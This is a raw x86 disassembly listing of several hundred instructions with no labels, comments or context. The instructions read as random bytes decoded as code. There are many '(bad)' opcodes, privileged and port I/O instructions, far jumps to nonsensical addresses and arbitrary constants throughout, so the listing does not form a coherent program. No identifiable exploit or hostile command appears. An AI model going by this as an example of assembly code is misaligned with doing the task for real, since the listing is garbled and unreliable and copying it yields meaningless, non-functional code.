  4172dc:	mov    cl,0x77
  4172de:	push   eax
  4172df:	test   al,0x32
  4172e1:	clc    
  4172e2:	mov    ecx,DWORD PTR [ebx-0x5d]
  4172e5:	add    ecx,DWORD PTR [edi+0x56dec41c]
  4172eb:	add    ebp,DWORD PTR [eax]
  4172ed:	mov    ah,0xac
  4172ef:	adc    ebp,ecx
  4172f1:	jle    0x417294
  4172f3:	xor    BYTE PTR [esi],ch
  4172f5:	push   esp
  4172f6:	and    DWORD PTR [edx+0x35],ebx
  4172f9:	outs   dx,DWORD PTR ds:[esi]
  4172fa:	xchg   esp,eax
  4172fb:	dec    esp
  4172fc:	xor    ebx,ecx
  4172fe:	pop    eax
  4172ff:	and    eax,0x502c2093
  417304:	sbb    BYTE PTR ds:0x9242aaf9,bl
  41730a:	rol    DWORD PTR [ebx],0x8d
  41730d:	repz and BYTE PTR [ecx],dh
  417310:	and    edi,DWORD PTR [ebp-0x67a8aa0e]
  417316:	adc    al,0x37
  417318:	mov    ecx,DWORD PTR [esi]
  41731a:	sbb    bh,BYTE PTR [ebp+edi*1-0xf7b3f37]
  417321:	jp     0x417331
  417323:	imul   DWORD PTR [esi-0x12]
  417326:	test   eax,0x92862d2f
  41732b:	mov    ebp,0xa16768
  417330:	pop    ss
  417331:	(bad)  
  417333:	pop    ebx
  417334:	push   edx
  417335:	iret   
  417336:	pop    ss
  417337:	aam    0x38
  417339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41733a:	in     al,0x8a
  41733c:	sbb    esp,DWORD PTR [ebp+0x6e]
  41733f:	addr16 jbe 0x417382
  417342:	call   0x4efbba75
  417347:	test   DWORD PTR [esi+0x7d463a04],esi
  41734d:	iret   
  41734e:	ds xor eax,0xf512cf4c
  417354:	cmc    
  417355:	jae    0x4172e3
  417357:	std    
  417358:	jl     0x4173b5
  41735a:	inc    edi
  41735b:	icebp  
  41735c:	pop    eax
  41735d:	repnz add BYTE PTR [edx+0x25],bh
  417361:	fistp  DWORD PTR [edx+0x5c60dfdc]
  417367:	cwde   
  417368:	in     eax,0x0
  41736a:	sub    BYTE PTR [ecx-0x7a1b8cb8],0x75
  417371:	fwait
  417372:	push   es
  417373:	xchg   edi,eax
  417374:	mov    ch,0x53
  417376:	jo     0x4173d5
  417378:	push   ss
  417379:	daa    
  41737a:	mov    ds:0x40138e9a,al
  41737f:	xor    esi,DWORD PTR [ebx+edx*8+0x13]
  417383:	inc    esi
  417384:	adc    cl,0xa8
  417387:	jecxz  0x417376
  417389:	das    
  41738a:	mov    esi,0x72a7cb04
  41738f:	test   esp,0x4a247599
  417395:	mov    DWORD PTR [ecx+0x54ddfd5c],ecx
  41739b:	cmp    eax,0x230cfc67
  4173a0:	je     0x4173a3
  4173a2:	out    0xa8,al
  4173a4:	cli    
  4173a5:	js     0x4173ba
  4173a7:	test   DWORD PTR [ebx-0x2136c90],esp
  4173ad:	push   eax
  4173ae:	pop    ds
  4173af:	pop    ebx
  4173b0:	jae    0x4173e0
  4173b2:	push   esp
  4173b3:	dec    ebx
  4173b4:	mov    al,ds:0x28de4288
  4173b9:	mov    ds:0x8cef3557,al
  4173be:	push   eax
  4173bf:	inc    esp
  4173c0:	push   0x4f
  4173c2:	adc    al,0x88
  4173c4:	or     dh,bh
  4173c6:	popf   
  4173c7:	sub    ch,BYTE PTR [edx]
  4173c9:	and    eax,0x29830231
  4173ce:	sub    BYTE PTR ds:0x11238029,ah
  4173d4:	and    ecx,edx
  4173d6:	push   ebx
  4173d7:	jo     0x417381
  4173d9:	addr16 cmp ebx,ecx
  4173dc:	inc    ecx
  4173dd:	sub    al,0xad
  4173df:	bound  edx,QWORD PTR [ebp-0x6c425798]
  4173e5:	pop    ss
  4173e6:	sub    bh,BYTE PTR [ebx-0x68]
  4173e9:	mov    cl,0x93
  4173eb:	or     edi,DWORD PTR ds:0xf22a7a99
  4173f1:	mov    ds:0x10aae8f1,al
  4173f6:	lock sbb esi,ebx
  4173f9:	or     eax,eax
  4173fb:	in     al,0xaa
  4173fd:	xchg   ebp,eax
  4173fe:	adc    eax,0x6b030089
  417403:	ja     0x417480
  417405:	jae    0x41739a
  417407:	jecxz  0x4173b1
  417409:	and    al,0xca
  41740b:	dec    ebp
  41740c:	sbb    edi,DWORD PTR [esp+edi*2-0x1d]
  417410:	dec    esp
  417411:	mov    cl,al
  417413:	pop    edi
  417414:	sbb    ebp,DWORD PTR [eax-0x18764ef0]
  41741a:	sub    ebx,edi
  41741c:	outs   dx,BYTE PTR ds:[esi]
  41741d:	cld    
  41741e:	sbb    BYTE PTR [ecx+0x58ae8179],cl
  417424:	clc    
  417425:	mov    DWORD PTR [edi+0x17],ebp
  417428:	jbe    0x417469
  41742a:	and    eax,0x6ef5e02a
  41742f:	(bad)  
  417430:	inc    ecx
  417431:	xchg   BYTE PTR [ebx+0x63],bh
  417434:	cmp    al,BYTE PTR [esi]
  417436:	fsub   QWORD PTR [edx]
  417438:	xchg   ecx,eax
  417439:	mov    ecx,0x1b513cfc
  41743e:	pop    eax
  41743f:	test   esp,ecx
  417441:	pop    edi
  417442:	mov    ebx,0x4984788c
  417447:	and    cl,BYTE PTR [edx+0x32fa084]
  41744d:	bound  edx,QWORD PTR [ebx]
  41744f:	or     esi,DWORD PTR [edi-0x52]
  417452:	fidiv  DWORD PTR [ebx]
  417454:	push   esi
  417455:	fld    st(4)
  417457:	dec    esi
  417458:	mov    al,0xb1
  41745a:	mov    ds:0xdd46994e,al
  41745f:	add    edi,0x136be2ba
  417465:	stos   DWORD PTR es:[edi],eax
  417466:	enter  0xbd3e,0xda
  41746a:	stc    
  41746b:	fdiv   st(0),st
  41746d:	inc    ebx
  41746e:	pop    eax
  41746f:	cmp    al,cl
  417471:	loopne 0x4173fd
  417473:	jb     0x4174c2
  417475:	jge    0x4173fa
  417477:	(bad)  [edi-0x52]
  41747a:	call   0xe596da97
  41747f:	aas    
  417480:	xchg   BYTE PTR [di-0x1a],cl
  417484:	add    bh,BYTE PTR [ebp+eax*2-0x999deff]
  41748b:	and    DWORD PTR [edi+0x2a],ebx
  41748e:	mov    ah,0x9
  417490:	int    0x9f
  417492:	inc    ebp
  417493:	mov    DWORD PTR [ecx],eax
  417495:	int3   
  417496:	daa    
  417497:	push   ebp
  417498:	and    DWORD PTR [eax+eax*4+0x2d],edi
  41749c:	retf   
  41749d:	add    edx,DWORD PTR [eax]
  41749f:	out    0xfe,eax
  4174a1:	imul   edx
  4174a3:	adc    ah,BYTE PTR [ebx-0x7353b783]
  4174a9:	ror    ah,cl
  4174ab:	pop    ecx
  4174ac:	adc    DWORD PTR [esi],0xffffffdd
  4174af:	inc    edx
  4174b0:	inc    ecx
  4174b1:	sub    bl,BYTE PTR [edx-0x7170f98b]
  4174b7:	in     eax,dx
  4174b8:	test   ah,dl
  4174ba:	adc    eax,ecx
  4174bc:	repz cmp dh,BYTE PTR [esp+esi*8-0x29]
  4174c1:	retf   
  4174c2:	in     al,0x40
  4174c4:	sbb    eax,0x2bdbab73
  4174c9:	lock cmp DWORD PTR [edi],ebx
  4174cc:	adc    eax,0xc6f3e87
  4174d1:	ins    DWORD PTR es:[edi],dx
  4174d2:	retf   0x44c
  4174d5:	les    ebx,FWORD PTR [esi]
  4174d7:	mov    bl,0xf7
  4174d9:	lahf   
  4174da:	ret    
  4174db:	pop    edi
  4174dc:	mov    al,0x23
  4174de:	sub    bh,BYTE PTR [ecx-0x5240e3bc]
  4174e4:	mov    cl,0x39
  4174e6:	pop    ds
  4174e7:	jle    0x417492
  4174e9:	sub    ecx,DWORD PTR ds:0x73cf9cd5
  4174ef:	mov    BYTE PTR ds:0xe25d8e9,al
  4174f5:	mov    cs,esi
  4174f7:	les    ebp,FWORD PTR [ebx-0x342e5703]
  4174fd:	rol    ebx,1
  4174ff:	cs mov esi,0x4a1ee711
  417505:	sub    dh,dl
  417507:	pusha  
  417508:	cmp    eax,0x35308554
  41750d:	cmp    eax,0xa6ffb38c
  417512:	es sbb al,0xc6
  417515:	jmp    0x6e569f84
  41751a:	add    al,0xe
  41751c:	push   edx
  41751d:	xchg   ebx,eax
  41751e:	pop    ds
  41751f:	mov    ebx,0x5bd06661
  417524:	pop    ebp
  417525:	dec    edi
  417526:	and    ebp,ebx
  417528:	ja     0xf59f49f2
  41752e:	les    esi,FWORD PTR ds:0x4230d5d1
  417534:	cli    
  417535:	dec    edi
  417536:	repz jns 0x417504
  417539:	mov    es,WORD PTR [ebp-0x20]
  41753c:	mov    eax,0x75e4be6c
  417541:	push   ebx
  417542:	or     al,0xe0
  417544:	pop    edi
  417545:	jns    0x417559
  417547:	call   ebx
  417549:	push   0xffffff99
  41754b:	(bad)  
  41754c:	mov    esi,0xf716bca8
  417551:	cld    
  417552:	test   eax,0xdb8e974
  417557:	xchg   BYTE PTR [ebx-0x51],ah
  41755a:	and    al,0x7e
  41755c:	cmp    BYTE PTR [ebx],dl
  41755e:	fist   DWORD PTR [ecx+0x46]
  417561:	mov    bh,0x17
  417563:	cmp    dl,BYTE PTR [ebx+0x1b]
  417566:	dec    esp
  417567:	popf   
  417568:	sbb    ecx,DWORD PTR [ebx]
  41756a:	push   ebx
  41756b:	sahf   
  41756c:	into   
  41756d:	add    eax,0x6351b2c7
  417572:	fldz   
  417574:	mov    ebx,0x370fcf5b
  417579:	je     0x417555
  41757b:	arpl   WORD PTR [eax+0x66],ax
  41757e:	stc    
  41757f:	cmp    DWORD PTR [esi+0x2e1b070a],esi
  417585:	sub    al,0xcf
  417587:	xchg   edx,eax
  417588:	(bad)  
  417589:	pop    ecx
  41758a:	inc    edi
  41758b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41758c:	xchg   ecx,eax
  41758d:	pop    ebp
  41758e:	push   0xffffffcd
  417590:	adc    dl,BYTE PTR [ecx-0x31]
  417593:	pusha  
  417594:	adc    al,0x24
  417596:	add    edi,DWORD PTR [esp+ebp*4]
  417599:	fwait
  41759a:	loopne 0x4175e4
  41759c:	pop    es
  41759d:	pop    ebx
  41759e:	lods   al,BYTE PTR ds:[esi]
  41759f:	sbb    BYTE PTR [eax],al
  4175a1:	mov    ds:0x125dbd4f,al
  4175a6:	and    ebx,edx
  4175a8:	mov    dh,0xac
  4175aa:	jmp    0x41753c
  4175ac:	icebp  
  4175ad:	clc    
  4175ae:	jmp    0xaf4d1563
  4175b3:	jp     0x41753a
  4175b5:	mov    bl,0x4e
  4175b7:	inc    edi
  4175b8:	push   esi
  4175b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175ba:	pop    ss
  4175bb:	mov    al,ds:0xcc2e5a08
  4175c0:	popf   
  4175c1:	in     eax,0x42
  4175c3:	and    ah,BYTE PTR [edi-0x7c8b6668]
  4175c9:	jae    0x41760f
  4175cb:	cmp    cl,BYTE PTR [edx-0x6b]
  4175ce:	pop    esp
  4175cf:	inc    eax
  4175d0:	add    ax,0xab37
  4175d4:	ins    BYTE PTR es:[edi],dx
  4175d5:	fstp   DWORD PTR [edi-0x2f]
  4175d8:	fild   DWORD PTR [edi+edx*1+0x1]
  4175dc:	ss call 0xcf2d:0xdedb7f44
  4175e4:	rcl    bh,cl
  4175e6:	loope  0x41759b
  4175e8:	dec    ebp
  4175e9:	pusha  
  4175ea:	push   ebx
  4175eb:	cdq    
  4175ec:	pop    edi
  4175ed:	or     DWORD PTR [edi+0x40],ebp
  4175f0:	sti    
  4175f1:	cmp    edx,DWORD PTR [eax]
  4175f3:	daa    
  4175f4:	add    BYTE PTR [ebp-0x7f19dbdb],ch
  4175fa:	add    bh,BYTE PTR [edx+0x302260d4]
  417600:	out    0x73,al
  417602:	(bad)  
  417603:	js     0x4175b4
  417605:	sub    esi,DWORD PTR [edi+0x2a]
  417608:	lods   al,BYTE PTR ds:[esi]
  417609:	mov    eax,0x6d1392e0
  41760e:	pop    edi
  41760f:	push   0x68
  417611:	and    DWORD PTR [esi-0x43],edi
  417614:	rcl    ah,cl
  417616:	(bad)
  41761a:	mov    BYTE PTR gs:[esi+edi*4-0x46],dl
  41761f:	repz inc edi
  417621:	cld    
  417622:	and    ah,bh
  417624:	lods   eax,DWORD PTR ds:[esi]
  417625:	and    edx,edx
  417627:	popa   
  417628:	jg     0x417665
  41762a:	jl     0x417662
  41762c:	sar    DWORD PTR [edx],cl
  41762e:	cdq    
  41762f:	std    
  417630:	mov    ebp,0x5bd55da7
  417635:	push   cs
  417636:	mov    dl,0xd1
  417638:	cmp    BYTE PTR [edi-0x3b8318ff],bh
  41763e:	imul   edx,DWORD PTR [eax+0x85173b1],0xae1fdad
  417648:	leave  
  417649:	out    dx,eax
  41764a:	dec    eax
  41764b:	xor    DWORD PTR [edi+0x48524b36],0xffffffc7
  417652:	repz fcom DWORD PTR [ecx+0x48ce82e7]
  417659:	or     dl,al
  41765b:	bound  edx,QWORD PTR [ebx]
  41765d:	mov    edi,0x8c4eabd6
  417662:	hlt    
  417663:	or     al,0xf
  417665:	inc    ebp
  417666:	in     eax,dx
  417667:	ficomp DWORD PTR [ebx]
  417669:	mov    ah,0xec
  41766b:	(bad)  
  41766c:	push   esp
  41766d:	stc    
  41766e:	das    
  41766f:	retf   
  417670:	int    0x82
  417672:	lods   al,BYTE PTR ds:[esi]
  417673:	je     0x41766c
  417675:	imul   esp,DWORD PTR [ebx],0xf032b06b
  41767b:	idiv   BYTE PTR [eax+0x3096ab2c]
  417681:	xor    al,0x4b
  417683:	xchg   BYTE PTR [esi],bh
  417685:	xor    BYTE PTR [edi],bh
  417687:	imul   esp,DWORD PTR [edx-0x1755f033],0x2e
  41768e:	mov    dh,0xc5
  417690:	scas   al,BYTE PTR es:[edi]
  417691:	aaa    
  417692:	pop    ebp
  417693:	iret   
  417694:	aaa    
  417695:	outs   dx,BYTE PTR ds:[esi]
  417696:	cs push esp
  417698:	and    eax,0xb30baf
  41769d:	sbb    ebx,DWORD PTR [esi+0x268324ff]
  4176a3:	inc    esi
  4176a4:	and    dh,bl
  4176a6:	cdq    
  4176a7:	sub    BYTE PTR [ecx+ebx*1],ah
  4176aa:	outs   dx,DWORD PTR ds:[esi]
  4176ab:	inc    esp
  4176ac:	fmul   st(1),st
  4176ae:	xor    BYTE PTR [ebx],dh
  4176b0:	xor    BYTE PTR [edx+0x1d],0x65
  4176b4:	sahf   
  4176b5:	pop    ecx
  4176b6:	dec    edx
  4176b7:	call   FWORD PTR [ebp+0x411c041a]
  4176bd:	sbb    eax,DWORD PTR [ebx+0x1f72cf4c]
  4176c3:	in     al,0x3c
  4176c5:	fcomi  st,st(7)
  4176c7:	rcl    BYTE PTR [edi+0x27],cl
  4176ca:	idiv   BYTE PTR [ecx+edx*2+0x56]
  4176ce:	push   eax
  4176cf:	cmp    dh,bh
  4176d1:	jnp    0x417744
  4176d3:	jmp    0xece1:0x23d0445c
  4176da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176db:	add    eax,ecx
  4176dd:	cmp    ebx,ebx
  4176df:	mov    DWORD PTR [ebx+0x2e8fbd2e],esi
  4176e5:	mov    eax,0x61d16f46
  4176ea:	das    
  4176eb:	shl    BYTE PTR [ebx+0x3f],cl
  4176ee:	loopne 0x4176e3
  4176f0:	inc    esp
  4176f1:	sahf   
  4176f2:	adc    dh,al
  4176f4:	inc    BYTE PTR [ebx+0x59]
  4176f7:	mov    al,0xa6
  4176f9:	fwait
  4176fa:	jnp    0x4176b4
  4176fc:	shl    ecx,0xb6
  4176ff:	(bad)  
  417700:	cli    
  417701:	add    eax,0xd21e06e2
  417706:	dec    edi
  417707:	int    0x4d
  417709:	enter  0x3a2c,0x2e
  41770d:	cmp    DWORD PTR [edi-0x5c],esi
  417710:	xchg   BYTE PTR [esi-0x3a],cl
  417713:	or     ebx,ebx
  417715:	cmp    al,0x42
  417717:	inc    ebx
  417718:	adc    al,0x73
  41771a:	sahf   
  41771b:	loop   0x417713
  41771d:	xor    dl,BYTE PTR [ebp+0x36178802]
  417723:	iret   
  417724:	jns    0x41778b
  417726:	out    0x48,eax
  417728:	jecxz  0x4176fc
  41772a:	cmp    esi,DWORD PTR [edx+ecx*1]
  41772d:	ins    DWORD PTR es:[edi],dx
  41772e:	je     0x417769
  417730:	shl    DWORD PTR [ebp+0x6b],0xa9
  417734:	mov    edx,0xcae1e430
  417739:	inc    edx
  41773a:	xchg   edx,eax
  41773b:	jl     0x417766
  41773d:	mov    esi,0xf400641e
  417742:	mov    bh,0x57
  417744:	pop    eax
  417745:	(bad)  
  417747:	dec    eax
  417748:	sbb    ch,BYTE PTR [esp+eiz*4-0x49]
  41774c:	sbb    ebx,edx
  41774e:	bound  ecx,QWORD PTR [ebp-0x70f0dc26]
  417754:	mul    DWORD PTR [edi]
  417756:	fidivr WORD PTR [ebx-0x73]
  417759:	ds mov edi,0x935e5ad9
  41775f:	fldcw  WORD PTR [esi+eax*2-0x1d]
  417763:	das    
  417764:	cs jne 0x417728
  417767:	lods   eax,DWORD PTR ds:[esi]
  417768:	hlt    
  417769:	dec    ebp
  41776a:	stos   DWORD PTR es:[edi],eax
  41776b:	in     eax,0xa0
  41776d:	dec    ecx
  41776e:	inc    esi
  41776f:	(bad)  
  417770:	sbb    DWORD PTR [ebx],esp
  417772:	push   ebx
  417773:	outs   dx,BYTE PTR ds:[esi]
  417774:	sub    BYTE PTR [eax],cl
  417776:	(bad)  
  417777:	pop    esp
  417778:	inc    edi
  417779:	iret   
  41777a:	jp     0x41770a
  41777c:	(bad)  
  41777d:	add    BYTE PTR [ebx+ebx*4-0x15],al
  417781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417782:	dec    ebp
  417783:	lds    esi,FWORD PTR [ecx]
  417785:	and    al,al
  417787:	sbb    esi,esi
  417789:	and    BYTE PTR [edx],dh
  41778b:	push   esi
  41778c:	dec    edx
  41778d:	pushf  
  41778e:	pusha  
  41778f:	clc    
  417790:	js     0x4177f6
  417792:	jp     0x417777
  417794:	sti    
  417795:	das    
  417796:	jo     0x41774c
  417798:	ficomp WORD PTR [edx]
  41779a:	rcr    DWORD PTR [ebp-0x60],cl
  41779d:	loop   0x41778c
  41779f:	inc    ebx
  4177a0:	shr    dh,0x8f
  4177a3:	pop    es
  4177a4:	inc    edx
  4177a5:	jp     0x417759
  4177a7:	cmp    dl,BYTE PTR gs:[ebx]
  4177aa:	push   edi
  4177ab:	cld    
  4177ac:	rol    BYTE PTR [esi-0x58],0xd0
  4177b0:	lods   eax,DWORD PTR ds:[esi]
  4177b1:	sbb    DWORD PTR [esi+0x1eedc3a3],0xc119827d
  4177bb:	add    al,0x68
  4177bd:	fld    DWORD PTR [eax-0x5936a3b3]
  4177c3:	outs   dx,BYTE PTR ds:[esi]
  4177c4:	fld    DWORD PTR [ebx-0x69]
  4177c7:	or     eax,0xe4df679f
  4177cc:	inc    ebx
  4177cd:	enter  0x1631,0x2d
  4177d1:	aas    
  4177d2:	or     bl,0x71
  4177d5:	pusha  
  4177d6:	add    eax,0x458bee72
  4177db:	outs   dx,BYTE PTR ds:[esi]
  4177dc:	ret    
  4177dd:	(bad)  
  4177de:	out    dx,eax
  4177df:	mov    dh,0xa5
  4177e1:	popa   
  4177e2:	jge    0x417826
  4177e4:	scas   eax,DWORD PTR es:[edi]
  4177e5:	cmp    bl,BYTE PTR [ebx]
  4177e7:	cld    
  4177e8:	and    ah,dh
  4177ea:	lahf   
  4177eb:	data16 clc 
  4177ed:	mov    bl,0x13
  4177f0:	fdiv   DWORD PTR [edi-0x2706b9ee]
  4177f6:	jge    0x4177b1
  4177f8:	cmp    ebx,DWORD PTR [eax-0x1c7de56d]
  4177fe:	pop    ebx
  4177ff:	push   edi
  417800:	mov    ecx,0x770a9639
  417805:	inc    edx
  417806:	push   ecx
  417807:	add    bh,ch
  417809:	mov    esi,0x100c4df7
  41780e:	mov    WORD PTR [esp+ebx*8],es
  417811:	gs lahf 
  417813:	test   edi,ebp
  417815:	xchg   si,ax
  417817:	jno    0x4177b9
  417819:	(bad)  
  41781b:	pop    esi
  41781c:	jge    0x4177f9
  41781e:	inc    esi
  41781f:	sahf   
  417820:	(bad)  
  417821:	aam    0x85
  417823:	and    cl,BYTE PTR [ebx+0x12]
  417826:	push   esi
  417827:	adc    eax,0xa3a9fb06
  41782c:	mov    ch,0x3a
  41782e:	ins    BYTE PTR es:[edi],dx
  41782f:	mov    ah,BYTE PTR [edx-0x38]
  417832:	mov    al,0xa3
  417834:	in     al,0x22
  417836:	imul   eax,DWORD PTR ds:0x19d87083,0x11
  41783d:	xchg   edx,eax
  41783e:	das    
  41783f:	fisub  DWORD PTR ss:[edx+0x618390d2]
  417846:	out    dx,eax
  417847:	jns    0x41786a
  417849:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41784a:	(bad)  
  41784b:	shl    BYTE PTR [esi-0x61],1
  41784e:	mov    esi,0xf48740d0
  417853:	cmp    al,0x6e
  417855:	imul   ebx,DWORD PTR [eax+0x5fe6840d],0xffffffd8
  41785c:	push   eax
  41785d:	jl     0x4178af
  41785f:	xor    BYTE PTR [esi+0x25],al
  417862:	mov    edx,0xdbb488d9
  417867:	xor    ebx,esi
  417869:	mov    al,ds:0x7faa54c2
  41786e:	lahf   
  41786f:	frstor ds:0x5dd17664
  417875:	pop    esi
  417876:	sti    
  417877:	sar    esi,cl
  417879:	xchg   esp,eax
  41787a:	add    eax,DWORD PTR [edi+ecx*4-0x64]
  41787e:	rcr    BYTE PTR [esi],1
  417880:	out    0x39,eax
  417882:	mov    ah,0x64
  417884:	(bad)  
  417886:	pop    esp
  417887:	dec    ebx
  417888:	shl    BYTE PTR [edi-0x45],0xdb
  41788c:	dec    eax
  41788d:	pop    eax
  41788e:	mov    ecx,0xbb553f2b
  417893:	adc    dh,ah
  417895:	cwde   
  417896:	fwait
  417897:	inc    edi
  417898:	(bad)  
  417899:	fisubr DWORD PTR [ebp-0x5a24995a]
  41789f:	lahf   
  4178a0:	add    BYTE PTR [ebx+ebp*2-0x138fe0fc],ch
  4178a7:	adc    ebx,ebp
  4178a9:	mov    eax,ds:0xe930c5c1
  4178ae:	jmp    0x4178bd
  4178b0:	popf   
  4178b1:	pushf  
  4178b2:	sar    BYTE PTR [edi+0x33a2a4d6],0xe2
  4178b9:	add    dl,BYTE PTR [esi-0x26b574e9]
  4178bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178c0:	mov    bl,0x89
  4178c2:	mov    bl,0xf
  4178c4:	dec    eax
  4178c5:	cmp    DWORD PTR [ecx+0x37e4aecf],edx
  4178cb:	cld    
  4178cc:	mov    dh,BYTE PTR [eax+0x47f9e4f7]
  4178d2:	and    edx,edi
  4178d4:	inc    esi
  4178d5:	inc    edx
  4178d6:	(bad)  
  4178d7:	mov    esi,eax
  4178d9:	icebp  
  4178da:	popf   
  4178db:	sub    BYTE PTR [ebx+0x7e8a77ee],dh
  4178e1:	cmp    al,0x41
  4178e3:	js     0x4178fb
  4178e5:	mov    ebx,0x989a3c63
  4178ea:	addr16 faddp st(3),st
  4178ed:	arpl   WORD PTR [eax-0x51],di
  4178f0:	loope  0x417885
  4178f2:	or     eax,0x97b1ded9
  4178f7:	add    di,sp
  4178fa:	xlat   BYTE PTR ds:[ebx]
  4178fb:	sbb    ah,BYTE PTR [edi-0xb48274c]
  417901:	push   cs
  417902:	in     al,0x7d
  417904:	leave  
  417905:	mov    WORD PTR [edx+0x4b],?
  417908:	(bad)  
  417909:	cdq    
  41790a:	sbb    ebp,DWORD PTR [edx-0x7d5fd4f8]
  417910:	add    ch,BYTE PTR ds:0x5fb16deb
  417916:	fstp   QWORD PTR [ecx+edx*1]
  417919:	xlat   BYTE PTR ds:[ebx]
  41791a:	push   ecx
  41791b:	jns    0x4178e4
  41791d:	inc    ebx
  41791e:	pop    edi
  41791f:	bound  ebx,QWORD PTR [ebx+0x5126ae0d]
  417925:	jo     0x4178d6
  417927:	add    bh,BYTE PTR [ebx+0x6c79e76f]
  41792d:	pop    esi
  41792e:	dec    ecx
  41792f:	scas   eax,DWORD PTR es:[edi]
  417930:	pop    es
  417931:	push   ecx
  417932:	push   edi
  417933:	xchg   edi,eax
  417934:	into   
  417935:	push   cs
  417936:	in     eax,0xa2
  417938:	mov    dh,0x14
  41793a:	jno    0x417946
  41793c:	adc    ebx,DWORD PTR [ebx]
  41793e:	or     al,0x14
  417940:	dec    ecx
  417941:	mov    ebp,0x6005fa84
  417946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417947:	jg     0x417971
  417949:	xchg   ebp,eax
  41794a:	out    dx,al
  41794b:	aam    0x26
  41794d:	cmp    al,0x6a
  41794f:	xor    dl,ah
  417951:	cdq    
  417952:	adc    esi,DWORD PTR [ebx-0x36ddbb76]
  417958:	mov    ds,WORD PTR [ebp-0x48]
  41795b:	cmp    edi,DWORD PTR [edi-0x12f9ce8d]
  417961:	dec    ebp
  417962:	cwde   
  417963:	fld    QWORD PTR cs:[edi]
  417966:	jns    0x417987
  417968:	repz mov ds:0xd891cdcb,al
  41796e:	stos   BYTE PTR es:[edi],al
  41796f:	ret    0x662e
  417972:	xchg   DWORD PTR [edi-0x33],eax
  417975:	push   0x44
  417977:	sub    bl,bh
  417979:	mov    bl,0x93
  41797b:	cmp    BYTE PTR [ecx*2+0x2a2c0432],0x3b
  417983:	lods   al,BYTE PTR ds:[esi]
  417984:	fcom   QWORD PTR [edi]
  417986:	sbb    BYTE PTR [esi],ah
  417988:	test   eax,0xa26256c4
  41798d:	fistp  WORD PTR [ebp+0x2de67187]
  417993:	enter  0x8daf,0xf5
  417997:	outs   dx,BYTE PTR ds:[esi]
  417998:	sub    eax,eax
  41799a:	nop
  41799b:	ficom  WORD PTR [edi*2+0x21418000]
  4179a2:	mov    dh,0xa4
  4179a4:	cmp    eax,0xec3a055f
  4179a9:	jl     0x41797f
  4179ab:	pop    edi
  4179ac:	outs   dx,DWORD PTR ds:[esi]
  4179ad:	push   es
  4179ae:	ret    
  4179af:	sub    eax,0xe44871e0
  4179b4:	setne  BYTE PTR [ecx]
  4179b7:	jecxz  0x4179c7
  4179b9:	xor    ebx,ebp
  4179bb:	loope  0x417a38
  4179bd:	(bad)  
  4179be:	or     al,0x28
  4179c0:	and    dh,BYTE PTR cs:[ecx]
  4179c3:	loope  0x417985
  4179c5:	shl    DWORD PTR [ecx-0x8],cl
  4179c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179c9:	dec    ebx
  4179ca:	sub    eax,0x6f3cb2b4
  4179cf:	mov    al,0xe3
  4179d1:	mov    al,0xe
  4179d3:	ins    BYTE PTR es:[edi],dx
  4179d4:	jne    0x417a2d
  4179d6:	leave  
  4179d7:	stc    
  4179d8:	shl    edx,cl
  4179da:	mov    esi,0xac941189
  4179df:	jle    0x417962
  4179e1:	cli    
  4179e2:	(bad)  
  4179e3:	and    al,0x53
  4179e5:	add    DWORD PTR [ebp+0x27],0xfffffff1
  4179e9:	lock inc esi
  4179eb:	ins    DWORD PTR es:[edi],dx
  4179ec:	add    al,0xab
  4179ee:	(bad)  
  4179ef:	xor    DWORD PTR [ecx-0x2f],ebp
  4179f2:	stos   DWORD PTR es:[edi],eax
  4179f3:	fld    TBYTE PTR [ecx-0x6314c457]
  4179f9:	pop    esi
  4179fa:	lods   al,BYTE PTR ds:[esi]
  4179fb:	rol    DWORD PTR [ebx],cl
  4179fd:	jmp    0xcfbe78c1
  417a02:	mov    edi,0x96019a51
  417a07:	jne    0x417a1f
  417a09:	mov    eax,0x4cf80805
  417a0e:	jg     0x4179f6
  417a10:	inc    edx
  417a11:	mov    ebx,0xa0bcbce2
  417a16:	mov    edx,0xdc0a3887
  417a1b:	cwde   
  417a1c:	jge    0x4179fb
  417a1e:	xor    al,0x94
  417a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a21:	cmc    
  417a22:	adc    BYTE PTR ds:0xf5b75e10,ch
  417a28:	or     eax,0x4845e2aa
  417a2d:	adc    edx,DWORD PTR [ebx+0x43]
  417a30:	mov    ebx,0xcc637e7a
  417a35:	jno    0x4179ec
  417a37:	mov    dl,0x88
  417a39:	fst    QWORD PTR [ecx+0x34]
  417a3c:	scas   al,BYTE PTR es:[edi]
  417a3d:	fs dec eax
  417a3f:	daa    
  417a40:	push   ecx
  417a41:	cmp    eax,0xd4a4c1b2
  417a46:	rol    ebp,cl
  417a48:	rcl    BYTE PTR [ebx],cl
  417a4a:	stc    
  417a4b:	lahf   
  417a4c:	adc    al,0x21
  417a4e:	dec    edi
  417a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a50:	mov    esp,0x86496f6e
  417a55:	ror    BYTE PTR [edx],0x1d
  417a58:	lods   eax,DWORD PTR ds:[esi]
  417a59:	es mov cs,ebx
  417a5c:	dec    edi
  417a5d:	dec    esp
  417a5e:	jmp    0x9a84:0x947389c5
  417a65:	scas   eax,DWORD PTR es:[edi]
  417a66:	mov    bl,0xfb
  417a68:	popa   
  417a69:	adc    eax,0x1c4c1dbe
  417a6e:	dec    ebp
  417a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a70:	fcmove st,st(2)
  417a72:	mov    dl,0x2f
  417a74:	xchg   edx,eax
  417a75:	ret    
  417a76:	and    al,bh
  417a78:	push   ss
  417a79:	mov    WORD PTR [eax],gs
  417a7b:	xor    ch,BYTE PTR [eax+0x2ffc0140]
  417a81:	rol    DWORD PTR [esi-0x4b],1
  417a84:	xor    ah,dl
  417a86:	pusha  
  417a87:	push   cs
  417a88:	ret    0x3267
  417a8b:	ins    DWORD PTR es:[edi],dx
  417a8c:	sub    eax,0xf18b32bd
  417a91:	ret    0xcb9d
  417a94:	jae    0x417a6b
